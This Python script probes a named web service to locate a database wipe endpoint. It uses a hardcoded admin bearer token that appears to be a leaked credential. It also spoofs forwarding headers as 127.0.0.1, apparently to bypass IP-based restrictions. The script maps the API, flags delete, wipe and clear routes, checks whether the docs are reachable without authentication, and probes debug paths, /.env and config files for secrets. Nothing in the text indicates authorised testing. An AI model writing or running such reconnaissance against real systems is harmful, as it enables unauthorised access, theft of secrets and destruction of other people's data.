#!/usr/bin/env python3
"""
Check FastAPI docs and find database wipe method
"""

import requests
import json

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

print("="*70)
print("CHECKING API DOCUMENTATION")
print("="*70)

# FastAPI auto-generates docs
docs_endpoints = [
    '/docs',
    '/redoc',
    '/openapi.json',
    '/api/docs',
    '/api/redoc',
    '/api/openapi.json',
]

print("\n[1] Checking API documentation...")
for endpoint in docs_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=10)
        print(f"{endpoint}: {resp.status_code}")
        
        if resp.status_code == 200 and 'application/json' in resp.headers.get('content-type', ''):
            data = resp.json()
            print(f"Found OpenAPI spec!")
            
            # Look for paths
            if 'paths' in data:
                print(f"\nAvailable endpoints:")
                for path, methods in data['paths'].items():
                    print(f"  {path}: {list(methods.keys())}")
                    
                    # Look for delete/wipe operations
                    if 'delete' in path.lower() or 'wipe' in path.lower() or 'clear' in path.lower():
                        print(f"    [!!!] Potential wipe endpoint: {path}")
            
            # Save full spec
            with open('openapi_spec.json', 'w') as f:
                json.dump(data, f, indent=2)
            print(f"\nSaved to openapi_spec.json")
            
    except Exception as e:
        pass

# Try to access docs without auth
print("\n[2] Trying docs without authentication...")
no_auth_headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

for endpoint in ['/docs', '/redoc', '/openapi.json']:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=no_auth_headers, timeout=10)
        if resp.status_code == 200:
            print(f"[+] {endpoint} accessible without auth!")
    except:
        pass

# Check for hidden admin endpoints
print("\n[3] Checking hidden admin endpoints...")
hidden_endpoints = [
    '/api/admin/debug',
    '/api/debug',
    '/api/admin/test',
    '/api/test',
    '/api/admin/dev',
    '/api/dev',
    '/.env',
    '/api/.env',
    '/config.json',
    '/api/config.json',
]

for endpoint in hidden_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        if resp.status_code == 200:
            print(f"[+] {endpoint}: {resp.text[:200]}")
    except:
        pass

print("\n" + "="*70)
